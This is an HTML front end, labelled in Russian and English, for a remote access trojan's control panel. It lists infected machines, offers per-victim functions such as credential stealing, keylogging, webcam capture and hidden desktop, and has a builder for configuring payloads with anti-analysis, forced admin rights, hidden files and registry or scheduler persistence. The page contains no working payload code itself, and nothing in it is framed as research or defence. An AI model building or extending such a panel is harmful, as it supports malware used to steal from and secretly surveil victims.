<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Панель управления</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>

    <div class="container">
        <!-- Главная навигация слева -->
        <nav class="main-nav">
            <a href="#" id="main-menu-btn" class="nav-button active" title="Главный экран"><i class="fas fa-home"></i></a>
            <a href="#" id="builder-btn" class="nav-button" title="Билдер"><i class="fas fa-hammer"></i></a>
        </nav>

        <!-- Основной контент -->
        <main class="content">

            <!-- Экран 1: Главный экран с пользователями -->
            <div id="main-screen" class="screen active">
                <div class="header">
                    <h2>Пользователи онлайн</h2>
                </div>
                <div class="user-list">
                    <!-- Пользователей будем добавлять через JS, но вот пример -->
                    <div class="user-item" data-id="user1">
                        <span><i class="fas fa-desktop"></i> DESKTOP-ABC123</span>
                        <span>192.168.1.10</span>
                        <span>Windows 10</span>
                        <span>USA</span>
                        <span>Online</span>
                    </div>
                    <div class="user-item" data-id="user2">
                        <span><i class="fas fa-laptop"></i> LAPTOP-XYZ789</span>
                        <span>10.0.0.5</span>
                        <span>Windows 11</span>
                        <span>Germany</span>
                        <span>Online</span>
                    </div>
                    <div class="user-item" data-id="user3">
                        <span><i class="fas fa-server"></i> SERVER-MAIN</span>
                        <span>8.8.8.8</span>
                        <span>Windows Server</span>
                        <span>USA</span>
                        <span class="offline">Offline</span>
                    </div>
                </div>
            </div>

            <!-- Экран 2: Экран подключенного пользователя -->
            <div id="connected-screen" class="screen">
                <div class="connected-layout">
                    <!-- Левая панель с командами -->
                    <div class="command-panel">
                        <button class="command-btn"><i class="fas fa-info-circle"></i> Information</button>
                        <button class="command-btn"><i class="fas fa-power-off"></i> Remote start</button>
                        <button class="command-btn"><i class="fas fa-globe"></i> Proxy</button>
                        <button class="command-btn"><i class="fas fa-cookie-bite"></i> Stealer</button>
                        <button class="command-btn"><i class="fas fa-clipboard"></i> Clipboard</button>
                        <button class="command-btn"><i class="fas fa-scroll"></i> Roll</button>
                        <button class="command-btn"><i class="fas fa-code"></i> Code & Scripts</button>
                        <button class="command-btn"><i class="fas fa-comments"></i> Communication</button>
                        <button class="command-btn"><i class="fas fa-tasks"></i> Task manager</button>
                        <button class="command-btn"><i class="fas fa-folder-open"></i> File manager</button>
                        <button class="command-btn"><i class="fas fa-terminal"></i> Terminal</button>
                        <button class="command-btn"><i class="fas fa-keyboard"></i> KeyLogger</button>
                        <button class="command-btn"><i class="fas fa-video"></i> Webcam</button>
                        <button class="command-btn active"><i class="fas fa-desktop"></i> Remote desktop</button>
                        <button class="command-btn"><i class="fas fa-eye-slash"></i> Hidden desktop</button>
                        <div class="spacer"></div>
                        <button class="command-btn"><i class="fas fa-cog"></i> Settings</button>
                        <button id="disconnect-btn" class="command-btn disconnect"><i class="fas fa-sign-out-alt"></i> Выйти</button>
                    </div>
                    <!-- Центральная область -->
                    <div class="main-view">
                        <div class="loading-spinner"></div>
                        <p class="status-text">Waiting for user...</p>
                    </div>
                </div>
            </div>

            <!-- Экран 3: Билдер -->
            <div id="builder-screen" class="screen">
                <div class="header">
                    <h2>Конструктор билда</h2>
                </div>
                <div class="builder-form">
                    <div class="form-column">
                        <div class="form-group">
                            <label for="name">name</label>
                            <input type="text" id="name" value="name">
                        </div>
                        <div class="form-group">
                            <label for="mutex">mutex</label>
                            <input type="text" id="mutex" value="WEBR_7J6HPJUSL4PR">
                        </div>
                        <div class="form-group">
                            <label for="comment">Comment</label>
                            <input type="text" id="comment" value="comment">
                        </div>
                        <div class="form-group">
                            <label for="anti-analysis">Anti-analysis</label>
                            <select id="anti-analysis">
                                <option>None</option>
                                <option>Basic</option>
                                <option>Advanced</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="extension">Extension</label>
                            <select id="extension">
                                <option>webbuild.exe</option>
                                <option>.dll</option>
                                <option>.scr</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-column">
                        <div class="form-group">
                            <label for="auto-steal">Auto Steal</label>
                            <select id="auto-steal">
                                <option>Once</option>
                                <option>Always</option>
                                <option>Never</option>
                            </select>
                        </div>
                         <div class="form-group">
                            <label for="force-admin">Force admin</label>
                            <select id="force-admin">
                                <option>Normal</option>
                                <option>Aggressive</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="install">Install</label>
                            <select id="install">
                                <option>Random</option>
                                <option>Program Files</option>
                                <option>AppData</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="copy-count">Copy count</label>
                            <div class="number-input">
                                <button>-</button>
                                <input type="number" id="copy-count" value="2">
                                <button>+</button>
                            </div>
                        </div>
                         <div class="form-group checkbox-group">
                            <input type="checkbox" id="hide-files">
                            <label for="hide-files">Hide files</label>
                        </div>
                        <div class="form-group">
                            <label for="autorun">Autorun</label>
                            <select id="autorun">
                                <option>Scheduler</option>
                                <option>Registry</option>
                                <option>Startup Folder</option>
                            </select>
                        </div>
                    </div>
                </div>
                 <div class="builder-footer">
                    <p class="warning">Default settings are recommended.</p>
                    <div class="builder-buttons">
                        <button id="create-build-btn">Create</button>
                        <button>Scripts</button>
                    </div>
                </div>
            </div>

        </main>
    </div>

    <script src="script.js"></script>
</body>
</html>
